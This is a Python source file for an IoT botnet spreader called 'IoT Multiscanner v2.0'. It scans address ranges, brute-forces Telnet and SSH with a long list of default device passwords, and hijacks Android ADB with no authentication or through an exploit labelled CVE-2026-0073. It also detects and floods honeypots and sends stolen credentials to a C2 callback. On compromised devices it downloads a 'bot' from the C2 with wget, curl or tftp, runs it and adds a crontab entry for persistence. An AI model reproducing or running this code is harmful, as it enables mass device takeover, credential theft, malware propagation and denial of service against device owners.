import socket
import struct
import threading
import sys
import time
import ssl
import os
import ipaddress
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional, List, Tuple, Dict, Set
from enum import IntEnum

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("iotscanner")

TELNET_PORTS = [23, 2323, 23231, 23232]
SSH_PORT = 22
ADB_PORT = 5555
DEFAULT_THREADS = 250
DEFAULT_TIMEOUT = 6
DEFAULT_CRED_FILE = "iot_creds.txt"
CALLBACK_PORT = 48101

class AdbCmd(IntEnum):
    CNXN = 0x4e584e43
    OPEN = 0x4e45504f
    OKAY = 0x59414b4f
    WRTE = 0x45545257
    CLSE = 0x45534c43
    AUTH = 0x48545541

ADB_VERSION = 0x01000001
ADB_MAX_PAYLOAD = 0x00100000

COWRIE_SIGNS = [
    "/home/cowrie/cowrie.cfg",
    "/opt/cowrie/etc/cowrie.cfg",
    "/cowrie/cowrie-git/etc/cowrie.cfg",
    "/cowrie/var/log/cowrie",
    "/opt/cowrie/var/log/cowrie",
    "/home/cowrie/var/log/cowrie",
]

@dataclass
class ScanResult:
    host: str
    port: int
    service: str
    username: str
    password: str
    banner: bytes = b""
    platform: str = "unknown"
    arch: str = "unknown"
    is_honeypot: bool = False
    error: Optional[str] = None

@dataclass
class C2Config:
    host: str
    port: int
    payload_path: str = "/bot"
    callback_port: int = CALLBACK_PORT

class AdbPacket:
    HEADER_FMT = "<6I"
    HEADER_SIZE = 24

    def __init__(self, command: int, arg0: int, arg1: int, data: bytes = b""):
        self.command = command
        self.arg0 = arg0
        self.arg1 = arg1
        self.data = data
        self.data_length = len(data)
        total = 0
        for b in data:
            total = (total + b) & 0xffffffff
        self.data_crc32 = total
        self.magic = command ^ 0xffffffff

    def encode(self) -> bytes:
        header = struct.pack(self.HEADER_FMT, self.command, self.arg0, self.arg1, self.data_length, self.data_crc32, self.magic)
        return header + self.data

    @classmethod
    def decode(cls, raw: bytes) -> "AdbPacket":
        cmd, a0, a1, dlen, _, _ = struct.unpack(cls.HEADER_FMT, raw[:cls.HEADER_SIZE])
        payload = raw[cls.HEADER_SIZE:cls.HEADER_SIZE + dlen] if dlen else b""
        return cls(cmd, a0, a1, payload)

def adb_send(sock, pkt, recv=True):
    try:
        sock.sendall(pkt.encode())
        if not recv:
            return None
        time.sleep(0.3)
        resp = sock.recv(8192)
        if len(resp) < 24:
            return None
        return AdbPacket.decode(resp)
    except:
        return None

def adb_shell(sock):
    resp = adb_send(sock, AdbPacket(AdbCmd.OPEN, 1, 0, b"shell:"))
    if not resp or resp.command not in (AdbCmd.OKAY, AdbCmd.WRTE):
        return None
    rid = resp.arg0 if resp.command == AdbCmd.OKAY else resp.arg1
    sock.sendall(AdbPacket(AdbCmd.WRTE, 1, rid, b"id\n").encode())
    time.sleep(0.6)
    try:
        return sock.recv(8192)
    except:
        return None

def adb_noauth(host, port=ADB_PORT, timeout=6):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        resp = adb_send(s, AdbPacket(AdbCmd.CNXN, ADB_VERSION, ADB_MAX_PAYLOAD, b"host::\x00"))
        if not resp:
            return None
        if resp.command == AdbCmd.CNXN:
            out = adb_shell(s)
            if out and len(out) > 8:
                plat = "unknown"
                arch = "unknown"
                if b"Linux" in out:
                    plat = "linux"
                if b"Android" in out:
                    plat = "android"
                if b"aarch64" in out or b"arm64" in out:
                    arch = "aarch64"
                elif b"armv" in out or b"ARM" in out:
                    arch = "arm"
                elif b"mips" in out:
                    arch = "mips"
                elif b"x86_64" in out or b"amd64" in out:
                    arch = "x86_64"
                return ScanResult(host=host, port=port, service="adb_noauth", username="shell", password="", banner=out[:512], platform=plat, arch=arch)
        return None
    except:
        return None
    finally:
        try:
            s.close()
        except:
            pass

def adb_cve(host, port=ADB_PORT, timeout=6):
    have_crypto = False
    try:
        from cryptography.hazmat.primitives.asymmetric import ec
        from cryptography.hazmat.primitives import serialization
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes
        import datetime
        have_crypto = True
    except:
        pass

    if not have_crypto:
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.settimeout(timeout)
        try:
            s2.connect((host, port))
            resp = adb_send(s2, AdbPacket(AdbCmd.CNXN, ADB_VERSION, ADB_MAX_PAYLOAD, b"host::\x00"))
            if not resp:
                return None
            if resp.command == AdbCmd.CNXN:
                out = adb_shell(s2)
                if out and len(out) > 8:
                    return ScanResult(host=host, port=port, service="adb_cve20260073", username="shell", password="", banner=out[:512])
            s2.close()
        except:
            try:
                s2.close()
            except:
                pass

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("ECDHE-ECDSA-AES128-GCM-SHA256")
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(timeout)
            tls = ctx.wrap_socket(raw, server_hostname=host)
            tls.connect((host, port))
            resp = adb_send(tls, AdbPacket(AdbCmd.CNXN, ADB_VERSION, ADB_MAX_PAYLOAD, b"host::\x00"))
            if resp and resp.command == AdbCmd.CNXN:
                out = adb_shell(tls)
                if out and len(out) > 8:
                    return ScanResult(host=host, port=port, service="adb_cve20260073", username="shell", password="", banner=out[:512])
            tls.close()
        except:
            try:
                raw.close()
            except:
                pass
        return None

    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import serialization
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes
    import datetime

    priv = ec.generate_private_key(ec.SECP256R1)
    pub = priv.public_key()
    subj = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"adb")])
    cert = (x509.CertificateBuilder()
        .subject_name(subj)
        .issuer_name(issuer)
        .public_key(pub)
        .serial_number(1)
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(hours=1))
        .sign(priv, hashes.SHA256()))
    cert_pem = cert.public_bytes(serialization.Encoding.PEM)
    key_pem = priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())

    import tempfile
    cert_fd, cert_path = tempfile.mkstemp()
    key_fd, key_path = tempfile.mkstemp()
    with os.fdopen(cert_fd, 'wb') as f:
        f.write(cert_pem)
    with os.fdopen(key_fd, 'wb') as f:
        f.write(key_pem)

    try:
        ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx2.check_hostname = False
        ctx2.verify_mode = ssl.CERT_NONE
        ctx2.set_ciphers("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256")
        ctx2.load_cert_chain(cert_path, key_path)
        raw2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw2.settimeout(timeout)
        tls2 = ctx2.wrap_socket(raw2, server_hostname=host)
        tls2.connect((host, port))
        resp2 = adb_send(tls2, AdbPacket(AdbCmd.CNXN, ADB_VERSION, ADB_MAX_PAYLOAD, b"host::\x00"))
        if resp2 and resp2.command == AdbCmd.CNXN:
            out2 = adb_shell(tls2)
            if out2 and len(out2) > 8:
                return ScanResult(host=host, port=port, service="adb_cve20260073", username="shell", password="", banner=out2[:512])
        tls2.close()
    except:
        try:
            raw2.close()
        except:
            pass
    finally:
        try:
            os.unlink(cert_path)
        except:
            pass
        try:
            os.unlink(key_path)
        except:
            pass

    s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s3.settimeout(timeout)
    try:
        s3.connect((host, port))
        resp = adb_send(s3, AdbPacket(AdbCmd.CNXN, ADB_VERSION, ADB_MAX_PAYLOAD, b"host::\x00"))
        if resp and resp.command == AdbCmd.CNXN:
            out = adb_shell(s3)
            if out and len(out) > 8:
                return ScanResult(host=host, port=port, service="adb_cve20260073", username="shell", password="", banner=out[:512])
        s3.close()
    except:
        try:
            s3.close()
        except:
            pass

    return None

def load_creds(path=DEFAULT_CRED_FILE):
    if os.path.isfile(path):
        creds = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(None, 1)
                creds.append((parts[0], parts[1] if len(parts) == 2 else ""))
        if creds:
            log.info(f"Loaded {len(creds)} credential pairs from {path}")
            return creds
        log.warning(f"Credential file {path} empty, using defaults")
    return [
        ("root","xc3511"),("root","vizxv"),("root","admin"),("admin","admin"),
        ("root","888888"),("root","xmhdipc"),("root","default"),("root","jauntech"),
        ("root","123456"),("root","54321"),("support","support"),("root",""),
        ("admin","password"),("root","root"),("root","12345"),("user","user"),
        ("admin",""),("root","pass"),("admin","admin1234"),("root","1111"),
        ("admin","smcadmin"),("admin","1111"),("root","666666"),("root","password"),
        ("root","1234"),("root","klv123"),("Administrator","admin"),
        ("service","service"),("supervisor","supervisor"),("guest","guest"),
        ("guest","12345"),("admin1","password"),("administrator","1234"),
        ("666666","666666"),("888888","888888"),("ubnt","ubnt"),
        ("root","klv1234"),("root","Zte521"),("root","hi3518"),
        ("root","jvbzd"),("root","anko"),("root","zlxx."),
        ("root","7ujMko0vizxv"),("root","7ujMko0admin"),("root","system"),
        ("root","ikwb"),("root","dreambox"),("root","user"),
        ("root","realtek"),("root","000000"),("admin","1111111"),
        ("admin","1234"),("admin","12345"),("admin","123456"),
        ("admin","54321"),("admin","meinsm"),("admin","pass"),
        ("root","00000000"),("root","0"),("admin","0"),
        ("pi","raspberry"),("root","raspberry"),("root","admin123"),
        ("root","passwd"),("admin","passwd"),("root","shell"),
        ("admin","shell"),("root","qwerty"),("admin","qwerty"),
        ("root","12345678"),("admin","12345678"),
        ("D-Link",""),("root","1001"),("admin","1001"),
        ("root","5up"),("admin","5up"),("root","abc123"),("admin","abc123"),
        ("root","cat1029"),("root","huigu309"),("root","iDirect"),
        ("root","juantech"),("root","nflection"),("root","oelinux123"),
        ("root","solokey"),("root","t0talc0ntr0l4!"),("root","taZz@23495859"),
        ("root","telecomadmin"),("root","twe8ehome"),("root","win1dows"),
        ("root","zhongxing"),("admin","123"),("root","123"),
        ("admin","111111"),("root","111111"),("admin","654321"),("root","654321"),
        ("root","admin12345"),("root","pfsense"),("root","letmein"),
    ]

def port_open(host, port, timeout=6):
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
            return True
    except:
        return False

def expand_targets(specs):
    targets = []
    for spec in specs:
        if os.path.isfile(spec):
            with open(spec) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.extend(expand_targets([line]))
        elif "/" in spec:
            try:
                for ip in ipaddress.ip_network(spec, strict=False).hosts():
                    targets.append(str(ip))
            except ValueError:
                targets.append(spec)
        else:
            targets.append(spec)
    seen = set()
    uniq = []
    for t in targets:
        if t not in seen:
            seen.add(t)
            uniq.append(t)
    return uniq

def detect_platform(data):
    if b"Linux" in data:
        return "linux"
    if b"Android" in data:
        return "android"
    if b"BusyBox" in data:
        return "busybox"
    if b"VxWorks" in data:
        return "vxworks"
    return "unknown"

def detect_arch(data):
    if b"aarch64" in data or b"arm64" in data:
        return "aarch64"
    if b"armv" in data or b"ARM" in data:
        return "arm"
    if b"mips" in data:
        return "mips"
    if b"x86_64" in data or b"amd64" in data:
        return "x86_64"
    if b"i686" in data or b"i386" in data or b"x86" in data:
        return "x86"
    return "unknown"

def banner_honeypot_check(banner):
    score = 0.0
    bl = banner.lower()
    if b"ubuntu" in bl and b"4.4.0" in bl:
        score += 0.3
    if b"debian" in bl and b"linux" in bl:
        score += 0.1
    return score

def shell_honeypot_check(host, port, sock, timeout):
    score = 0.0
    details = []
    try:
        sock.sendall(b"nproc\n")
        time.sleep(0.4)
        resp = b""
        try:
            resp = sock.recv(4096)
        except:
            pass
        if b"2" in resp and b"command not found" not in resp and b"not found" not in resp:
            score += 0.3
            details.append("nproc=2")
    except:
        pass
    for path in COWRIE_SIGNS:
        try:
            sock.sendall(f"test -f {path} && echo EXISTS\n".encode())
            time.sleep(0.3)
            try:
                resp = sock.recv(4096)
                if b"EXISTS" in resp:
                    score += 0.7
                    details.append(f"artifact:{path}")
                    break
            except:
                pass
        except:
            pass
    try:
        sock.sendall(b"cat /proc/1/cgroup 2>/dev/null | head -3\n")
        time.sleep(0.3)
        try:
            resp = sock.recv(4096)
            if b"docker" in resp or b"lxc" in resp:
                score += 0.3
                details.append("container")
        except:
            pass
    except:
        pass
    return score, details

def honeypot_dos(host, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        for payload in [b"\x00" * 65535, b"%x" * 5000, b"A" * 32768]:
            try:
                s.sendall(payload)
                time.sleep(0.05)
            except:
                break
        s.close()
    except:
        pass

def try_telnet(host, port, creds, timeout):
    for user, pwd in creds:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            banner = b""
            try:
                banner = s.recv(1024)
            except:
                pass
            hp_banner = banner_honeypot_check(banner)
            if hp_banner >= 0.3:
                log.info(f"Honeypot banner on {host}:{port}")
                honeypot_dos(host, port)
                s.close()
                return ScanResult(host=host, port=port, service="telnet_honeypot", username=user, password=pwd, banner=banner[:256], is_honeypot=True, error="banner_match")
            s.sendall(user.encode() + b"\n")
            time.sleep(0.35)
            try:
                s.recv(1024)
            except:
                pass
            s.sendall(pwd.encode() + b"\n")
            time.sleep(0.6)
            resp = b""
            try:
                resp = s.recv(4096)
            except:
                pass
            if resp and (b"#" in resp or b"$" in resp or b"BusyBox" in resp or b"> " in resp):
                hp_score, hp_details = shell_honeypot_check(host, port, s, timeout)
                if hp_score >= 0.5:
                    log.warning(f"Honeypot confirmed on {host}:{port} score={hp_score}")
                    honeypot_dos(host, port)
                    s.close()
                    return ScanResult(host=host, port=port, service="telnet_honeypot", username=user, password=pwd, banner=resp[:256], is_honeypot=True, error=";".join(hp_details))
                plat = detect_platform(banner + resp)
                arch = detect_arch(resp)
                s.close()
                return ScanResult(host=host, port=port, service="telnet", username=user, password=pwd, banner=resp[:256], platform=plat, arch=arch)
            s.close()
        except:
            if s:
                try:
                    s.close()
                except:
                    pass
    return None

def try_ssh(host, port, creds, timeout):
    try:
        import paramiko
    except:
        return None
    for user, pwd in creds:
        client = None
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=user, password=pwd, timeout=timeout, allow_agent=False, look_for_keys=False, banner_timeout=timeout, auth_timeout=timeout)
            _, stdout, stderr = client.exec_command("id; uname -m", timeout=timeout)
            out = stdout.read() + stderr.read()
            client.close()
            plat = detect_platform(out)
            arch = detect_arch(out)
            return ScanResult(host=host, port=port, service="ssh", username=user, password=pwd, banner=out[:512], platform=plat, arch=arch)
        except:
            if client:
                try:
                    client.close()
                except:
                    pass
    return None

def c2_report(host, port, user, pwd, c2_host, c2_cb_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((c2_host, c2_cb_port))
        s.sendall(f"{host}:{port} {user}:{pwd}\n".encode())
        s.close()
        log.info(f"Reported {host} to C2 callback {c2_host}:{c2_cb_port}")
        return True
    except:
        log.debug(f"C2 callback unreachable {c2_host}:{c2_cb_port}")
        return False

def c2_deploy_telnet(host, port, user, pwd, c2, timeout):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        try:
            s.recv(1024)
        except:
            pass
        s.sendall(user.encode() + b"\n")
        time.sleep(0.4)
        try:
            s.recv(1024)
        except:
            pass
        s.sendall(pwd.encode() + b"\n")
        time.sleep(0.5)
        try:
            s.recv(4096)
        except:
            pass
        dl = f"cd /tmp; wget -q http://{c2.host}:{c2.port}{c2.payload_path} -O bot || curl -s http://{c2.host}:{c2.port}{c2.payload_path} -o bot || tftp {c2.host} -c get bot 2>/dev/null"
        s.sendall((dl + "\n").encode())
        time.sleep(0.6)
        try:
            s.recv(4096)
        except:
            pass
        s.sendall(f"chmod 755 /tmp/bot; /tmp/bot {c2.host} {c2.port}\n".encode())
        time.sleep(0.5)
        try:
            s.recv(4096)
        except:
            pass
        s.sendall(f"echo '*/5 * * * * /tmp/bot {c2.host} {c2.port}' | crontab -\n".encode())
        time.sleep(0.3)
        s.close()
        log.info(f"Payload deployed on {host} -> C2 {c2.host}:{c2.port}")
        return True
    except:
        if s:
            try:
                s.close()
            except:
                pass
        return False

class IoTScanner:
    def __init__(self, creds, threads=250, timeout=6, enable_ssh=False, c2=None, aggressive=True):
        self.creds = creds
        self.threads = threads
        self.timeout = timeout
        self.enable_ssh = enable_ssh
        self.c2 = c2
        self.aggressive = aggressive
        self.results = []
        self.honeypots = []
        self.reported = set()
        self.lock = threading.Lock()

    def scan_single(self, target):
        st = ScanTarget(target)
        if not st.ip:
            return
        ip = st.ip

        for tp in TELNET_PORTS:
            if port_open(ip, tp, self.timeout):
                log.info(f"Telnet open on {ip}:{tp}")
                result = try_telnet(ip, tp, self.creds, self.timeout)
                if result:
                    if result.is_honeypot:
                        log.warning(f"HONEYPOT {ip}:{tp} - {result.error}")
                        with self.lock:
                            self.honeypots.append(result)
                    else:
                        log.info(f"TELNET HIT {ip}:{tp} {result.username}:{result.password} [{result.platform}/{result.arch}]")
                        with self.lock:
                            self.results.append(result)
                        if self.c2:
                            rkey = f"{ip}:{tp}"
                            with self.lock:
                                if rkey not in self.reported:
                                    self.reported.add(rkey)
                            c2_report(ip, tp, result.username, result.password, self.c2.host, self.c2.callback_port)
                            c2_deploy_telnet(ip, tp, result.username, result.password, self.c2, self.timeout)

        if self.enable_ssh and port_open(ip, SSH_PORT, self.timeout):
            log.info(f"SSH open on {ip}:22")
            result = try_ssh(ip, SSH_PORT, self.creds, self.timeout)
            if result:
                log.info(f"SSH HIT {ip}:22 {result.username}:{result.password} [{result.platform}/{result.arch}]")
                with self.lock:
                    self.results.append(result)
                if self.c2:
                    rkey = f"{ip}:22"
                    with self.lock:
                        if rkey not in self.reported:
                            self.reported.add(rkey)
                    c2_report(ip, SSH_PORT, result.username, result.password, self.c2.host, self.c2.callback_port)
                    c2_deploy_telnet(ip, SSH_PORT, result.username, result.password, self.c2, self.timeout)

        if port_open(ip, ADB_PORT, self.timeout):
            log.info(f"ADB open on {ip}:5555 - trying unauth")
            result = adb_noauth(ip, ADB_PORT, self.timeout)
            if not result:
                log.info(f"ADB {ip}:5555 needs auth - trying CVE-2026-0073")
                result = adb_cve(ip, ADB_PORT, self.timeout)
            if result:
                log.info(f"ADB HIT {ip}:5555 {result.service} [{result.platform}/{result.arch}]")
                with self.lock:
                    self.results.append(result)
                if self.c2:
                    rkey = f"{ip}:5555"
                    with self.lock:
                        if rkey not in self.reported:
                            self.reported.add(rkey)
                    c2_report(ip, ADB_PORT, "shell", "none", self.c2.host, self.c2.callback_port)
                    try:
                        import subprocess
                        cmd = f"adb connect {ip}:5555 && adb -s {ip}:5555 shell \"cd /data/local/tmp && wget http://{self.c2.host}:{self.c2.port}{self.c2.payload_path} -O bot && chmod 755 bot && ./bot {self.c2.host} {self.c2.port}\""
                        subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                        log.info(f"ADB payload deployed on {ip}")
                    except:
                        pass

    def scan(self, targets):
        log.info(f"Scanner: {len(self.creds)} creds, {self.threads} threads, {self.timeout}s timeout")
        log.info(f"C2: {'enabled ' + self.c2.host + ':' + str(self.c2.port) if self.c2 else 'disabled'}")
        log.info(f"SSH: {'enabled' if self.enable_ssh else 'disabled'}")
        log.info(f"Targets: {len(targets)}")
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self.scan_single, t): t for t in targets}
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    log.error(f"Error scanning {futures[f]}: {e}")
        return self.results, self.honeypots

@dataclass
class ScanTarget:
    host: str
    ip: str = ""
    def __post_init__(self):
        if not self.ip:
            try:
                socket.inet_aton(self.host)
                self.ip = self.host
            except:
                try:
                    self.ip = socket.gethostbyname(self.host)
                except:
                    self.ip = ""

def print_results(results, honeypots, reported_count):
    if results:
        print(f"\n{'='*100}")
        print(f"  {'HOST':<18} {'PORT':<6} {'SERVICE':<18} {'CREDENTIALS':<28} {'PLATFORM':<10} {'ARCH':<10}")
        print(f"{'='*100}")
        for r in sorted(results, key=lambda x: (x.service, x.host)):
            h = r.host.ljust(18)
            p = str(r.port).ljust(6)
            s = r.service.ljust(18)
            c = f"{r.username}:{r.password}" if r.password else "(no auth)"
            c = c.ljust(28)
            pl = r.platform.ljust(10)
            a = r.arch.ljust(10)
            print(f"  {h}{p}{s}{c}{pl}{a}")
        print(f"{'='*100}")
        print(f"  COMPROMISED: {len(results)}")
        if reported_count:
            print(f"  REPORTED TO C2: {reported_count}")
        print()
    if honeypots:
        print(f"\n{'='*100}")
        print(f"  HONEYPOTS NEUTRALIZED:")
        print(f"{'='*100}")
        for r in honeypots:
            print(f"  {r.host:<18} {str(r.port):<6} {r.service:<18} {r.error or ''}")
        print(f"{'='*100}")
        print(f"  TOTAL HONEYPOTS: {len(honeypots)}")
        print()

def main():
    import argparse
    parser = argparse.ArgumentParser(description="IoT Multiscanner v2.0")
    parser.add_argument("targets", nargs="+", help="IPs, CIDRs, hostnames, or files")
    parser.add_argument("--cred-file", default=DEFAULT_CRED_FILE)
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS)
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--ssh", action="store_true", help="Enable SSH brute-force")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--show-cred-count", action="store_true")
    parser.add_argument("--c2", metavar="HOST:PORT", help="C2 server for auto-deploy")
    parser.add_argument("--c2-payload", default="/bot", help="Payload path on C2 HTTP server")
    parser.add_argument("--callback-port", type=int, default=CALLBACK_PORT)
    parser.add_argument("--no-aggressive", action="store_true", help="Disable honeypot DoS")
    parser.add_argument("--show-honeypots", action="store_true")

    args = parser.parse_args()
    if args.verbose:
        logging.getLogger("iotscanner").setLevel(logging.DEBUG)

    creds = load_creds(args.cred_file)
    if args.show_cred_count:
        print(f"Credentials: {len(creds)}")
        sys.exit(0)

    c2_config = None
    if args.c2:
        try:
            host, port_str = args.c2.rsplit(":", 1)
            c2_config = C2Config(host=host, port=int(port_str), payload_path=args.c2_payload, callback_port=args.callback_port)
            log.info(f"C2: {c2_config.host}:{c2_config.port} payload={c2_config.payload_path} cb={c2_config.callback_port}")
        except:
            log.error("Invalid C2 format, use HOST:PORT")
            sys.exit(1)

    expanded = expand_targets(args.targets)
    if not expanded:
        log.error("No targets")
        sys.exit(1)

    log.info(f"Targets: {len(expanded)}")
    scanner = IoTScanner(creds=creds, threads=args.threads, timeout=args.timeout, enable_ssh=args.ssh, c2=c2_config, aggressive=not args.no_aggressive)
    results, honeypots = scanner.scan(expanded)
    print_results(results, honeypots, len(scanner.reported) if scanner.c2 else 0)

if __name__ == "__main__":
    main()
